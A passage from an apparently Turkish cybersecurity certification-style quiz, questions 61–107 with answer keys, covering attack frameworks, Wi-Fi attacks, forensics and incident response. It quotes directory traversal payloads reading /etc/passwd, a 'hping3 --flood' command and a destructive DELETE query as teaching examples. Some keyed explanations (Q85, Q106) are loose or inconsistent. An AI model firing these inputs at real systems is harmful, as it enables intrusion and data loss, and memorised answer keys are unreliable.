**Açıklama:** Directory Traversal'da saldırgan `../../etc/passwd` gibi göreli yol ifadeleri kullanarak web uygulamasının erişmemesi gereken sistem dosyalarına ulaşmaya çalışır. Input validation bu saldırıyı önler.

---

**61.** "Cyber Kill Chain" modelinde "Delivery" aşaması ne anlama gelir?

A) Saldırı aracının hazırlanması  
B) Hedef hakkında bilgi toplanması  
C) Silahın (zararlı yazılım/exploit) hedefe iletilmesi  
D) Sisteme kalıcı yerleşme  

**Doğru Cevap: C**  
**Açıklama:** Kill Chain'in 7 aşaması sırayla: Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions. Delivery aşamasında silah e-posta, USB veya web sitesi aracılığıyla hedefe ulaştırılır.

---

**62.** "MITRE ATT&CK" çerçevesi nasıl kullanılır?

A) Firewall kurallarını otomatik yapılandırır  
B) Gerçek saldırılardan elde edilen taktik ve teknikleri kataloglar; Threat Hunting ve savunma boşluğu analizinde referans alınır  
C) SSL sertifikalarını yönetir  
D) Log dosyalarını sıkıştırır  

**Doğru Cevap: B**  
**Açıklama:** MITRE ATT&CK, gerçek saldırılardan öğrenilmiş yüzlerce tekniği kategorize eder. Threat Hunters tehdit arar, Red Team simülasyon planlar, Blue Team ise savunma açıklarını bu çerçeveyle değerlendirir.

---

**63.** SIEM ve SOAR arasındaki temel fark nedir?

A) SIEM daha pahalıdır  
B) SIEM log toplar ve alarm üretir; SOAR bu alarmları alarak yanıtı otomatikleştirir  
C) SOAR yalnızca log analizi yapar  
D) İkisi aynı ürünün farklı isimleridir  

**Doğru Cevap: B**  
**Açıklama:** SIEM olayları toplar, korelasyon yapar ve alarm üretir. SOAR ise bu alarmı alarak önceden tanımlanmış playbook'lar aracılığıyla yanıtı otomatikleştirir (hesap kilitleme, IP engelleme vb.). İkisi birlikte SOC verimliliğini artırır.

---

**64.** Aşağıdaki senaryoda hangi güvenlik ilkesi uygulanmaktadır?
*"Şirket ağı, muhasebe, IT ve üretim için ayrı alt ağlara bölünmüş. Muhasebe bilgisayarı ele geçirilse bile IT sistemlerine doğrudan erişilemiyor."*

A) Zero Trust  
B) Network Segmentation  
C) Defense in Depth  
D) B ve C birlikte  

**Doğru Cevap: D**  
**Açıklama:** Bu senaryo hem Network Segmentation (ağı bölme) hem de Defense in Depth (katmanlı savunma) örneklemektedir. Segmentasyon, lateral movement'ı engelleyerek ihlal hasarını sınırlar.

---

**65.** "WPA3"ü WPA2'den daha güvenli kılan temel özellik nedir?

A) Daha uzun şifre gerektirmesi  
B) SAE (Simultaneous Authentication of Equals) protokolü ile offline brute force saldırılarına çok daha dirençli olması  
C) Daha hızlı bağlantı sağlaması  
D) Tüm cihazlarla geriye dönük uyumlu olması  

**Doğru Cevap: B**  
**Açıklama:** WPA3'teki SAE protokolü, WPA2'deki PSK el sıkışmasının zayıflığını giderir. Saldırgan el sıkışmayı yakalasa bile offline brute force yapamaz; her deneme online bağlantı gerektirir.

---

**66.** "Deauth Attack" hangi amaçla kullanılır?

A) DNS önbelleğini zehirlemek  
B) Wi-Fi cihazını ağdan düşürmek, genellikle Evil Twin saldırısına zemin hazırlamak için  
C) SQL sorgularını manipüle etmek  
D) E-posta trafiğini şifrelemek  

**Doğru Cevap: B**  
**Açıklama:** Deauth Attack, sahte 802.11 yönetim çerçevesi göndererek cihazı ağdan koparır. Saldırgan genellikle cihazı kendi Evil Twin'ine bağlatmak veya WPA2 handshake'ini yakalamak için bu tekniği kullanır.

---

**67.** "Rogue Access Point" ne anlama gelir?

A) Güçlü sinyal yayan yasal erişim noktası  
B) Kurumsal ağa yetkisiz bağlanmış sahte kablosuz erişim noktası  
C) Yönlendirici tabanlı saldırı aracı  
D) VPN uç noktası  

**Doğru Cevap: B**  
**Açıklama:** Rogue Access Point, bir çalışanın ağı genişletmek için kendi router'ını takması gibi durumlarda oluşur. Güvenlik politikasını atlatarak ağa yetkisiz erişim kapısı açar. 802.1X kontrolü bu tehdidi azaltır.

---

**68.** "APT (Advanced Persistent Threat)"ın temel özellikleri nelerdir?

A) Kısa süreli, yüksek sesli saldırılar  
B) İyi kaynaklanmış saldırganların uzun süre sistemde gizli kalarak veri çaldığı veya altyapıya zarar verdiği sofistike kampanyalar  
C) Yalnızca web uygulamalarını hedefler  
D) Script kiddie'lerin kullandığı hazır araçlar  

**Doğru Cevap: B**  
**Açıklama:** APT = Advanced (özel araçlar, zero-day) + Persistent (aylar/yıllar boyunca gizli) + Threat (belirli hedef). Genellikle devlet desteklidir. Stuxnet ve APT28 (Fancy Bear) tarihsel örneklerdir.

---

**69.** `curl` komutunun güvenlik testlerinde kullanım amacı nedir?

A) Disk imajı almak  
B) HTTP istekleri göndererek web sunucusu yanıtını, header'ları ve API davranışını test etmek  
C) Ağ trafiğini yakalamak  
D) Firewall kurallarını listelemek  

**Doğru Cevap: B**  
**Açıklama:** `curl -I https://example.com` yalnızca HTTP header'larını getirir. `-k` ile sertifika doğrulaması atlanır. `-X POST -d "data"` ile POST istekleri gönderilir. Web uygulaması güvenlik testlerinde yaygın kullanılır.

---

**70.** "VLAN Hopping" saldırısı ağ güvenliği açısından neden önemlidir?

A) Ağ bant genişliğini tüketir  
B) VLAN izolasyonunu kırarak ağ segmentasyonunu devre dışı bırakır  
C) DNS kayıtlarını bozar  
D) Şifreli trafiği çözer  

**Doğru Cevap: B**  
**Açıklama:** VLAN'lar ağ segmentasyonu için tasarlanmıştır. Switch Spoofing veya Double Tagging yöntemiyle saldırgan bir VLAN'dan diğerine yetkisiz erişim sağlar ve izolasyon kırılır.

---

**71.** Blue Team ve Red Team'in temel görevleri doğru sırayla hangi şıkta verilmiştir?

A) Blue: Saldırı simülasyonu, Red: Savunma yönetimi  
B) Blue: Savunma (firewall, log izleme, incident response), Red: Saldırı simülasyonu  
C) İkisi de yalnızca log analizi yapar  
D) Red: Yasal uyum, Blue: Penetration testing  

**Doğru Cevap: B**  
**Açıklama:** Red Team gerçek saldırganları simüle ederek güvenlik açıklarını bulur. Blue Team ise savunmayı yönetir. Purple Team ikisini bir araya getirerek Red'in bulgularını Blue'nun savunmasına yansıtır.

---

**72.** "Whaling" saldırısı kimliği hedefler?

A) Sistem yöneticileri  
B) Yazılım geliştiriciler  
C) CEO, CFO gibi C-Level üst düzey yöneticiler  
D) IT yardım masası çalışanları  

**Doğru Cevap: C**  
**Açıklama:** Whaling, Spear Phishing'in en yüksek profilli hedeflere yönelik versiyonudur. C-Level yöneticiler büyük finansal kararlar alabildiğinden ve yüksek ayrıcalıklı sistemlere erişebildiğinden özellikle hedef alınır.

---

**73.** `memdump` aracı adli bilişimde neden kritiktir?

A) Disk imajı alır  
B) RAM içeriğini dosyaya dökerek sistem kapatıldığında yok olacak şifre, anahtar ve fileless malware gibi verileri korur  
C) Log dosyalarını analiz eder  
D) Ağ bağlantılarını listeler  

**Doğru Cevap: B**  
**Açıklama:** Bellek (RAM) içeriği sistem kapatılınca kaybolur. Fileless malware, şifreleme anahtarları ve açık şifreler yalnızca bellekte bulunur. Memdump ile anlık bellek görüntüsü alınarak bu veriler korunur.

---

**74.** "Drive-by Attack" ile "Watering Hole Attack" arasındaki fark nedir?

A) İkisi aynı saldırıdır  
B) Drive-by herhangi bir kötü amaçlı siteyi ziyaret etmekle tetiklenir; Watering Hole ise özellikle hedefin ziyaret ettiği güvenilir site ele geçirilir  
C) Drive-by yalnızca mobil cihazları etkiler  
D) Watering Hole e-posta kullanır  

**Doğru Cevap: B**  
**Açıklama:** Drive-by saldırısı, kullanıcının herhangi bir kötü amaçlı siteye girmesiyle tetiklenir. Watering Hole ise çok daha hedefli; saldırgan kurbanın düzenli ziyaret ettiği güvenilir siteyi ele geçirir.

---

**75.** "False Negative" bir güvenlik sistemi açısından neden en tehlikeli durumdur?

A) Çok fazla alarm üretmesi ekibi yorduğu için  
B) Gerçek bir saldırının tespit edilemeden geçmesi anlamına geldiği için  
C) Sistem kaynaklarını tükettiği için  
D) Yasal uyumu zorlaştırdığı için  

**Doğru Cevap: B**  
**Açıklama:** False Positive gereksiz alarmla ekibi yorarken, False Negative gerçek saldırının gözden kaçmasına neden olur. Saldırganın sistemde fark edilmeden kalması (APT) en tehlikeli senaryodur.

---

**76.** "Password Spray" saldırısı neden kurumsal ortamlarda etkilidir?

A) Tek bir hesabı çok hızlı kırar  
B) Çok sayıda hesaba az sayıda yaygın şifre deneyerek hesap kilitleme eşiğini aşmadan yayılır  
C) Şifreli trafiği çözer  
D) Yönetici hesaplarını hedefler  

**Doğru Cevap: B**  
**Açıklama:** Kurumsal politikalar genellikle belirli sayıda başarısız denemeden sonra hesabı kilitler. Password Spray tek hesaba çok deneme yapmak yerine bir şifreyi binlerce hesaba dener; böylece kilit mekanizmasını tetiklemez.

---

**77.** "Autopsy" aracı hangi amaçla kullanılır?

A) Ağ trafiğini yakalar  
B) Disk imajlarını görsel arayüzle analiz eden, silinmiş veri ve dijital delilleri kurtaran adli bilişim platformu  
C) Port güvenlik açıklarını tarar  
D) Firewall kurallarını yönetir  

**Doğru Cevap: B**  
**Açıklama:** Autopsy, Sleuth Kit üzerine kurulu açık kaynaklı adli bilişim aracıdır. Disk imajlarında otomatik analiz, silinmiş dosya kurtarma, internet geçmişi ve metadata analizi yapar.

---

**78.** "Diamond Model" hangi dört bileşen üzerinden saldırıyı analiz eder?

A) Motivation, Tools, Timeline, Impact  
B) Adversary, Infrastructure, Capability, Victim  
C) Reconnaissance, Weaponization, Delivery, Exploitation  
D) Confidentiality, Integrity, Availability, Non-Repudiation  

**Doğru Cevap: B**  
**Açıklama:** Diamond Model: Adversary (saldırgan), Infrastructure (kullanılan altyapı), Capability (araç/teknik) ve Victim (hedef). Bu dört köşenin ilişkileri saldırganın profil, motivasyon ve sonraki adımlarını tahmin etmeye yarar.

---

**79.** IPsec'in iki ana protokol bileşeni ve farkları nelerdir?

A) TLS ve DTLS — biri TCP, diğeri UDP kullanır  
B) AH (Authentication Header) kimlik doğrulama+bütünlük, ESP (Encapsulating Security Payload) şifreleme+bütünlük sağlar  
C) IKE ve ISAKMP — anahtar değişimi için kullanılır  
D) SHA ve MD5 — hash algoritmaları  

**Doğru Cevap: B**  
**Açıklama:** IPsec'te AH, kimlik doğrulama ve bütünlük sağlar ama şifreleme yapmaz. ESP ise hem şifreleme hem bütünlük sağlar. Pratikte ESP çok daha yaygın kullanılır. VPN tünellerinin temelini oluşturur.

---

**80.** "Lessons Learned" aşaması Incident Response sürecinde neden atlanmamalıdır?

A) Yasal zorunluluk gerektirdiğinden  
B) Her olayın öğrenme fırsatı sunduğu; yazılan rapor ve süreç iyileştirmeleriyle aynı saldırının tekrarlanma olasılığının azaltıldığından  
C) SIEM alarmlarını kapatmak gerektiğinden  
D) Yalnızca büyük olaylarda gereklidir  

**Doğru Cevap: B**  
**Açıklama:** Lessons Learned, kriz sonrasında "ne yanlış gitti, ne iyi gitti, nasıl önleriz?" sorularını yanıtlar. Bulgu ve iyileştirmeler Runbook'lara yansıtılır. Bu aşama atlanırsa aynı saldırı tekrar başarılı olabilir.

---

## BÖLÜM III — ZOR (Sorular 81–120)
*Senaryo analizi, karmaşık karşılaştırmalar ve derinlemesine anlama*

---

**81.** Bir güvenlik analisti ağda aşağıdaki aktiviteyi fark ediyor: Gece 02:00'de normal kullanıcı hesabından bankacılık sistemine erişilmiş, aynı hesabın log kayıtları silinmiş ve sistem dışına birkaç MB veri gönderilmiş. En muhtemel saldırı türü ve Containment aşamasındaki ilk eylem nedir?

A) Ransomware saldırısı; sistemi hemen kapatmak  
B) APT / Insider Threat; hesabı devre dışı bırakmak, mevcut log'ları korumak ve forensic analiz başlatmak  
C) Phishing; e-posta sunucusunu kapatmak  
D) DDoS; firewall kurallarını güncellemek  

**Doğru Cevap: B**  
**Açıklama:** Gece erişimi (iz gizleme), log silme (Covering Tracks) ve küçük veri transferleri (exfiltration) APT örüntüsüdür. Containment'ta sistemi hemen kapatmak forensic delilleri yok edebilir; önce hesap devre dışı bırakılır, loglar korunur, forensic analiz başlatılır.

---

**82.** Aşağıdaki senaryoyu analiz edin:
*"Şirketin web sunucusu ve veritabanı sunucusu aynı ağ segmentinde. Web sunucusu ele geçirilen saldırgan, doğrudan veritabanına erişiyor."*
Hangi iki güvenlik eksikliği aynı anda mevcuttur?

A) Zayıf şifre politikası ve MFA eksikliği  
B) DMZ ve Network Segmentation eksikliği  
C) Antivirus ve patch yönetimi eksikliği  
D) Firewall ve IDS eksikliği  

**Doğru Cevap: B**  
**Açıklama:** Web sunucusu DMZ'de, veritabanı ise ayrı korumalı iç segmentte olmalıydı. Network Segmentation olmadan lateral movement engellenemez; bir sistem ele geçirilince tüm ağ tehlikeye girer.

---

**83.** OSI modelini kullanarak bir HTTPS bağlantısında hangi katmanlar aktiftir ve her birinin rolü nedir?

A) Yalnızca Layer 7 aktiftir  
B) Layer 7 (HTTP içeriği), Layer 6 (TLS şifreleme), Layer 4 (TCP güvenilir iletim), Layer 3 (IP yönlendirme), Layer 2 (Ethernet çerçeveleme), Layer 1 (fiziksel iletim)  
C) Yalnızca Layer 3 ve Layer 4 aktiftir  
D) Layer 5 ve Layer 6 yalnızca şifreli bağlantılarda aktiftir  

**Doğru Cevap: B**  
**Açıklama:** HTTPS'te tüm OSI katmanları çalışır. Layer 7 HTTP, Layer 6 TLS şifreleme/format, Layer 4 TCP bağlantı yönetimi, Layer 3 IP adresleme ve yönlendirme, Layer 2 MAC adresleme ve Layer 1 fiziksel sinyal iletimi.

---

**84.** `tcpdump -i eth0 port 443 -w capture.pcap` komutunun yaptığı işlemin tüm adımlarını doğru sırayla açıklayan şık hangisidir?

A) DNS sorguları yapar ve sonuçları dosyaya kaydeder  
B) eth0 arayüzündeki yalnızca HTTPS (443) trafiğini yakalar ve capture.pcap dosyasına yazar; daha sonra Wireshark ile analiz edilebilir  
C) Tüm ağ trafiğini yakalar ve sıkıştırır  
D) Port 443'ü tarar ve açık olup olmadığını test eder  

**Doğru Cevap: B**  
**Açıklama:** `-i eth0` arayüzü belirler, `port 443` filtresi yalnızca HTTPS trafiğini yakalar, `-w capture.pcap` trafiği dosyaya yazar. Dosya daha sonra Wireshark'ta açılarak görsel analiz yapılabilir.

---

**85.** Bir saldırgan şu teknik zincirini kullanıyor: OSINT → Spear Phishing e-postası → Kötü amaçlı makro içeren Excel dosyası → Reverse Shell → Lateral Movement → Veri exfiltration. Kill Chain'de bu adımlar hangi aşamalara karşılık gelir?

A) Tümü Delivery aşamasıdır  
B) Reconnaissance → Delivery → Exploitation → Installation → C2 → Actions on Objectives  
C) Weaponization → Delivery → Exploitation → Installation → C2  
D) Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions  

**Doğru Cevap: D**  
**Açıklama:** OSINT=Reconnaissance, Spear Phishing=Delivery, Excel açılması=Exploitation, Reverse Shell=Installation, uzaktan komut=C2, veri çalma=Actions on Objectives. Weaponization (makro hazırlama) senaryo öncesinde gerçekleşmiştir.

---

**86.** Aşağıdaki senaryoda hangi güvenlik açığı istismar edilmekte ve nasıl önlenebilir?
*"Web uygulaması `?file=../../../../etc/passwd` parametresini doğrulamadan dosyaya erişmek için kullanıyor."*

A) SQL Injection; prepared statements kullanılmalı  
B) Directory Traversal; input validation, yol normalizasyonu ve chroot/jail ortamı kullanılmalı  
C) XSS; Content Security Policy uygulanmalı  
D) CSRF; CSRF token kullanılmalı  

**Doğru Cevap: B**  
**Açıklama:** Directory Traversal, `../` karakterleriyle web kök dizininin dışına çıkmayı hedefler. Önlem: gelen yol parametrelerinin mutlak yola çevrilip izin verilen dizin içinde olup olmadığı doğrulanmalı; chroot ile de kökten kısıtlama yapılabilir.

---

**87.** EAP ve PEAP'ı karşılaştırarak neden kurumsal Wi-Fi'de PEAP tercih edildiğini açıklayan doğru şık hangisidir?

A) PEAP daha hızlıdır  
B) EAP kimlik bilgilerini düz olarak taşıyabilir; PEAP ise TLS tüneli içine alarak kimlik bilgilerini korur  
C) EAP yalnızca wired ağlarda çalışır  
D) PEAP şifre gerektirmez  

**Doğru Cevap: B**  
**Açıklama:** EAP çerçevesi şifreleme içermez; saldırgan EAP trafiğini yakalayabilir. PEAP, önce TLS tüneli kurar ve kimlik doğrulama bu şifreli tünel içinde gerçekleşir. Bu sayede kimlik bilgileri ağ üzerinden korunmuş olur.

---

**88.** Bir SOC analistinin SIEM üzerinde şu korelasyon kuralını oluşturduğunu düşünün:
*"Aynı IP'den 5 dakika içinde 100'den fazla başarısız SSH denemesi → alarm."*
Bu kuralla ilgili hangi risk mevcuttur?

A) Kural çok az alarm üretir  
B) Kural False Positive üretebilir (meşru sistem testi); aynı zamanda düşük hızlı Password Spray saldırısını kaçırabilir (False Negative)  
C) Kural yalnızca UDP trafiğini izler  
D) Kural log dosyalarını bozar  

**Doğru Cevap: B**  
**Açıklama:** Eşik tabanlı kurallar iki riskle yüzleşir. Eşik çok düşükse False Positive artar (ekip yorulur). Saldırgan eşiğin altında kalacak şekilde yavaş tarama yaparsa (Password Spray) kural False Negative üretir. İyi SIEM kuralı bu dengeyi dikkate alır.

---

**89.** Aşağıdaki Zero Trust mimarisi bileşenlerini doğru eşleştirin:

*I. Microsegmentation / II. Continuous Verification / III. Least Privilege Access*

A) I: Her erişimi doğrula, II: Ağı küçük parçalara böl, III: Min izin ver  
B) I: Ağı küçük parçalara böl, II: Her erişimi sürekli doğrula, III: Kullanıcıya min izin ver  
C) I: Şifreleme, II: Firewall, III: IDS  
D) I: VPN, II: MFA, III: SSO  

**Doğru Cevap: B**  
**Açıklama:** Zero Trust'ın üç temel bileşeni: Microsegmentation (ağı küçük izole parçalara böl), Continuous Verification (her erişimi konumdan bağımsız doğrula), Least Privilege (minimum gereken izni ver). Bu üçü birlikte Zero Trust'ı hayata geçirir.

---

**90.** "Memory Leak" güvenlik açısından iki farklı tehlike oluşturur. Bu tehlikeler hangi şıkta doğru verilmiştir?

A) Veri şifreleme ve ağ trafiği artışı  
B) Sistemin belleği tüketerek çökmesi (Availability ihlali) ve serbest bırakılmamış bellekte kalan hassas verinin (şifre, anahtar) başka süreçlerce okunabilmesi  
C) Log dosyalarının bozulması ve DNS kaynaklarının tükenmesi  
D) Disk alanının dolması ve CPU aşırı yüklenmesi  

**Doğru Cevap: B**  
**Açıklama:** Memory Leak'in güvenlik boyutu: (1) Availability — sistem zamanla belleği tüketir ve çöker. (2) Confidentiality — serbest bırakılmamış bellek hassas veri içeriyorsa başka süreçlerce okunabilir. Heartbleed (2014) bu ikinci tehlikenin en ünlü örneğidir.

---

**91.** Bir penetration tester `nmap -sS -sV -O -A hedef` komutu çalıştırıyor. Bu komutu analiz edin:

A) Yalnızca UDP portlarını tarar  
B) -sS: stealth SYN taraması, -sV: servis sürümü tespiti, -O: işletim sistemi tespiti, -A: agresif (OS+servis+script+traceroute) — kapsamlı bir keşif taraması  
C) Tüm ağ trafiğini yakalar  
D) ARP tablosunu günceller  

**Doğru Cevap: B**  
**Açıklama:** `-sS` tam TCP bağlantısı kurmadan (stealth) SYN taraması yapar. `-sV` açık portlardaki servis sürümlerini belirler. `-O` işletim sistemini fingerprint'ler. `-A` tüm bunları birleştirip ek scriptler çalıştırır. En kapsamlı ama en "gürültülü" nmap taramasıdır.

---

**92.** OWASP Top 10'da "Broken Access Control" neden en üst sıradayken, "SQL Injection" daha aşağı düştü?

A) SQL Injection artık mevcut değildir  
B) Broken Access Control daha çok uygulamada tespit ediliyor; SQL Injection ise parametreli sorgularla büyük ölçüde önlenebilir hale geldi  
C) OWASP yalnızca yeni saldırıları listeler  
D) SQL Injection artık yalnızca NoSQL veritabanlarını etkiler  

**Doğru Cevap: B**  
**Açıklama:** Prepared statements ve ORM kullanımı yaygınlaştıkça SQL Injection görülme sıklığı azaldı. Buna karşın Broken Access Control (yetki kontrolü hataları — kullanıcı başkasının verisine erişebiliyor) hâlâ en yaygın web açığı olmaya devam ediyor.

---

**93.** Aşağıdaki Incident Response senaryosunu analiz edin:
*"Saldırı tespit edildi. Ekip içinde tartışma var: Birinci analist sistemi hemen kapatmak, ikinci analist önce network'ten izole etmek, üçüncü analist ise yalnızca izlemeye devam etmek istiyor."*
Doğru yaklaşım hangisidir?

A) Hemen kapatmak her zaman doğrudur  
B) İzolasyon (network'ten ayırma) en doğrudur; kapatma forensic delilleri yok edebilir, salt izleme ise hasarın devam etmesine neden olur  
C) Yalnızca izlemek gerekir  
D) Kullanıcıları uyarıp sisteme devam etmelerini sağlamak  

**Doğru Cevap: B**  
**Açıklama:** Containment'ta sistem ağdan izole edilir (saldırgan bağlantısı kesilir, deliller korunur) ama kapatılmaz. Kapatma RAM içeriğini, geçici dosyaları ve forensic verileri yok eder. Salt izleme ise saldırının devam etmesine izin verir.

---

**94.** Key Exchange mekanizması neden asymmetric encryption kadar önemlidir?

A) Symmetric encryption'dan daha hızlıdır  
B) Güvenli kanal olmadan symmetric key paylaşımı imkânsızdır; Key Exchange bu problemi çözer ve session key'in güvenle oluşturulmasını sağlar  
C) Tüm veriyi kendisi şifreler  
D) Hash fonksiyonlarının yerini alır  

**Doğru Cevap: B**  
**Açıklama:** Symmetric encryption çok hızlıdır ama key'in güvenli paylaşılması sorunludur. Diffie-Hellman Key Exchange, gözetlenen kanalda bile ortak secret üretebilir. HTTPS'te TLS handshake bu mekanizmayla session key üretir, ardından AES ile hızlı veri şifreleme yapılır.

---

**95.** "Fileless Malware" neden geleneksel antivirus için sorun oluşturur?

A) Çok büyük dosyalar kullandığı için  
B) Diske yazmadan yalnızca RAM'de çalıştığından imza tabanlı tespit mekanizmaları çalışmaz  
C) Şifreli iletişim kullandığı için  
D) Yalnızca Linux'u hedeflediği için  

**Doğru Cevap: B**  
**Açıklama:** Geleneksel antivirus, disk üzerindeki dosyaları tarar. Fileless malware yalnızca bellekte çalışır ve sistem araçlarını (PowerShell, WMI) kötüye kullanır. EDR'ın davranış tabanlı analizi bu tehditleri tespit etmede daha etkilidir.

---

**96.** Aşağıdaki güvenlik senaryosunda hangi attack türü ve savunma önerilmektedir?
*"Kullanıcı kafe Wi-Fi'sine bağlandı. Bağlantısı aniden kesildi ve 'CafeWifi' adında yeni bir ağ belirdi. Kullanıcı bağlandı, artık tüm trafiği görülüyor."*

A) DNS Poisoning; DNSSEC kullanılmalı  
B) Evil Twin + Deauth Attack kombinasyonu; VPN kullanımı en etkili savunmadır  
C) Replay Attack; timestamp eklenmeli  
D) VLAN Hopping; switch yapılandırması düzeltilmeli  

**Doğru Cevap: B**  
**Açıklama:** Saldırgan önce Deauth Attack ile kullanıcıyı ağdan düşürdü, ardından aynı SSID ile Evil Twin kurdu. Kullanıcı sahte ağa bağlandı. VPN tüm trafiği şifreler; saldırgan trafiği görebilir ama içeriği okuyamaz.

---

**97.** Bir SOC ekibi MITRE ATT&CK çerçevesini Threat Hunting'de nasıl kullanır?

A) Yalnızca log toplamak için  
B) Bilinen saldırı tekniklerini referans alarak "Bu TTP sistemimizde gerçekleşti mi?" hipoteziyle proaktif arama yapmak  
C) Firewall kurallarını otomatik oluşturmak için  
D) SSL sertifikalarını yönetmek için  

**Doğru Cevap: B**  
**Açıklama:** MITRE ATT&CK, saldırgan TTP'lerini (Tactics, Techniques, Procedures) kataloglar. Threat Hunter "APT28 bu tekniği kullanıyor; bizim sistemimizde bu tekniğin izleri var mı?" şeklinde hipotez kurar ve SIEM üzerinde aktif arama yapar.

---

**98.** Aşağıdaki senaryoda hangi güvenlik ilkesi ihlal edilmiştir ve nasıl düzeltilir?
*"Yazılım geliştirici, üretim veritabanına tam erişim yetkisiyle çalışıyor. Yanlışlıkla `DELETE FROM users WHERE 1=1` sorgusu çalıştırdı."*

A) Defense in Depth; ikinci güvenlik duvarı ekle  
B) Least Privilege ihlali; geliştirici yalnızca test ortamı yetkisine sahip olmalı, üretim için ayrı kontrollü erişim gerekli  
C) MFA eksikliği; çok faktörlü doğrulama ekle  
D) Encryption eksikliği; veritabanı şifrelenmiş olmalı  

**Doğru Cevap: B**  
**Açıklama:** Least Privilege, her kullanıcının yalnızca görevi için gereken minimum izne sahip olmasını gerektirir. Geliştirici üretim veritabanında DML işlemi yapmamalıdır. Ortam ayrımı (dev/test/prod) ve ayrı erişim kontrolleri bu hatayı önlerdi.

---

**99.** WPS'in kapatılması neden önerilir?

A) Bağlantı hızını azaltır  
B) WPS PIN'inin 8 haneli yapısı Pixie Dust Attack ve brute force saldırılarına karşı son derece savunmasızdır  
C) WPA3 ile uyumsuzluk yaratır  
D) Sinyal menzilini kısıtlar  

**Doğru Cevap: B**  
**Açıklama:** WPS'in 8 haneli PIN'i teoride 100 milyon kombinasyon sunsa da tasarım hatası nedeniyle yalnızca 11.000 denemede kırılabilir. Pixie Dust Attack ise bazı router'larda tek denemede PIN'i ele geçirir. WPS kapatılması şiddetle önerilir.

---

**100.** "Chain of Custody" ilkesi neden dijital adli bilişimde en kritik gereksinimdir?

A) Verinin şifrelenmesini sağlar  
B) Dijital delillerin toplanmasından mahkemeye sunulmasına kadar kimin eline geçtiğini belgeleyerek delil bütünlüğünü ve mahkemede geçerliliği garanti eder  
C) Forensic analizin hızını artırır  
D) Log dosyalarının boyutunu azaltır  

**Doğru Cevap: B**  
**Açıklama:** Mahkemede dijital delilin kabul edilmesi için Chain of Custody belgesi zorunludur. "Bu delil ele geçirilmemiş mi, kim tarafından değiştirilmemiş mi?" sorularının yanıtlanması gerekir. Hash değerleri (MD5/SHA) delil bütünlüğünü kanıtlar.

---

**101.** Aşağıdaki senaryoda saldırgan hangi teknikler zincirini kullanmıştır?
*"(1) Şirket web sitesinden çalışan adları toplandı. (2) LinkedIn profilleri incelendi. (3) Çalışana IT yöneticisi gibi e-posta atıldı. (4) Sahte şifre sıfırlama linki gönderildi. (5) Kullanıcı tıkladı ve kimlik bilgilerini girdi."*

A) SQL Injection → XSS → Session Hijacking  
B) OSINT → Spear Phishing → Credential Harvesting  
C) War Dialing → Brute Force → Privilege Escalation  
D) DNS Poisoning → Pharming → MitM  

**Doğru Cevap: B**  
**Açıklama:** (1)+(2) OSINT/Passive Reconnaissance, (3) Impersonation (kimliğe bürünme), (4)+(5) Spear Phishing → Credential Harvesting. Teknik saldırı hiç gerekmemiş; yalnızca sosyal mühendislik kullanılmış.

---

**102.** FTK Imager'ı `dd`'den ayıran en önemli özellik nedir?

A) FTK Imager daha hızlıdır  
B) FTK Imager GUI sunar, orijinal medyaya yazmadan salt okunur erişim sağlar ve hash doğrulamasıyla delil bütünlüğünü otomatik kanıtlar  
C) FTK Imager yalnızca RAM analizi yapar  
D) dd Windows'ta çalışmaz  

**Doğru Cevap: B**  
**Açıklama:** `dd` güçlü ama ham bir araçtır; yanlış kullanımda diski silebilir. FTK Imager ise GUI'si, write-blocker entegrasyonu ve otomatik MD5/SHA hash hesaplamasıyla adli bilişim süreçlerinde tercih edilir.

---

**103.** Aşağıdaki senaryoda hangi güvenlik açıkları tespit edilmektedir ve ideal savunma mimarisi nasıl olmalıdır?
*"Şirketin tek firewall'u var; arkasında tüm sistemler aynı ağda. Web sunucusu, veritabanı ve Domain Controller yan yana. Firewall'dan geçilince her şeye erişiliyor."*

A) Güçlü şifre politikası eksik  
B) Flat network mimarisi; DMZ, Network Segmentation, microsegmentation ve VLAN yapılandırması ile katmanlı mimari kurulmalı  
C) Antivirus eksik  
D) MFA eksikliği  

**Doğru Cevap: B**  
**Açıklama:** Flat network (düz ağ) mimarisi, tek engelin aşılmasıyla tüm sisteme erişim demektir. Doğru mimari: Web sunucusu DMZ'de, veritabanı ayrı segmentte, Domain Controller ayrı yönetim ağında, aralarında güvenlik kuralları tanımlı.

---

**104.** `grep` ve `tail -f` komutlarını birleştiren gerçek zamanlı güvenlik izleme komutu yazılırsa ne yapılmış olur?

A) Disk imajı gerçek zamanlı alınır  
B) `tail -f /var/log/auth.log | grep "Failed"` komutu: log dosyasına anlık eklenen her satırı izler ve yalnızca başarısız giriş denemelerini filtreler  
C) DNS sorguları gerçek zamanlı izlenir  
D) Ağ trafiği gerçek zamanlı yakalanır  

**Doğru Cevap: B**  
**Açıklama:** `tail -f` log'a eklenen yeni satırları anlık gösterir. Pipe (`|`) ile `grep "Failed"` filtresi eklenerek yalnızca başarısız denemeler ekrana yazdırılır. Bir saldırı şüphesinde gerçek zamanlı izleme için kritik kombinasyondur.

---

**105.** Penetration Testing "Rules of Engagement" belgesi neden kritiktir?

A) Test ekibinin ücretini belirler  
B) Hangi sistemlerin test edileceğini, zaman aralığını ve acil iletişim prosedürlerini tanımlayarak test ekibini yasal koruma altına alır ve kapsam dışı sisteme dokunmayı önler  
C) Saldırı tekniklerini belgeler  
D) Log dosyalarının saklanma süresini belirler  

**Doğru Cevap: B**  
**Açıklama:** Rules of Engagement olmadan yapılan sızma testi yasadışı erişim sayılır. Scope dışına çıkmak, kritik üretim sistemine zarar vermek veya yasal sorun çıkması halinde bu belge hem tester'ı hem müşteriyi korur.

---

**106.** Aşağıdaki senaryoda hangi iki saldırı zinciri birlikte kullanılmaktadır?
*"Saldırgan önce `hping3 --flood` ile hedefi deauth attack gibi ağdan koparıyor, ardından aynı SSID ile sahte AP kuruyor."*

A) SQL Injection + XSS  
B) DoS/Flood + Evil Twin (Deauth Attack + Rogue AP)  
C) DNS Poisoning + CSRF  
D) Buffer Overflow + Replay Attack  

**Doğru Cevap: B**  
**Açıklama:** `hping3 --flood` DoS/flood saldırısı yaparak bağlantıyı zorla kesiyor. Ardından Evil Twin (sahte AP) kurularak kullanıcı sahte ağa bağlatılıyor. İki teknik birlikte MitM senaryosu oluşturuyor.

---

**107.** "Threat Intelligence" ile "OSINT" arasındaki hiyerarşik ilişki nedir?

A) İkisi birbiriyle ilgisiz kavramlardır  
